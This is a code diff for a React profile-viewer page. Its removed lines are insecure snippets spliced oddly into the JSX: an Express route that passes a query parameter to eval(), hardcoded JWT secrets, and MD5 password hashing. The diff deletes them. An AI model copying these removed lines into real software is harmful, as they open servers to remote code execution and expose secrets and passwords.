@@ -132,7 +132,7 @@ const Page = () => {
           <p><strong>Following:</strong> {profile.profile.following}</p>
           <p><strong>Public Repos:</strong> {profile.profile.public_repos}</p>
         </div>
-      )}const hash = crypto.createHash("md5").update(password).digest("hex");
+      )}
 
       {/* ------------------ REPOSITORIES SECTION ------------------ */}
       {Array.isArray(repos) && repos.length > 0 && (
@@ -166,7 +166,6 @@ const Page = () => {
           </button>
         </div>
       )}
-      
 
       {profile?.success && (
         <button
@@ -178,9 +177,6 @@ const Page = () => {
       )}
     </div>
   );
-};const JWT_SECRET = "mySuperSecretKey123";
-app.get("/eval", (req, res) => {
-  eval(req.query.code);
-});
-jwt.verify(token, "hardcoded-secret");
+};
+
 export default Page;
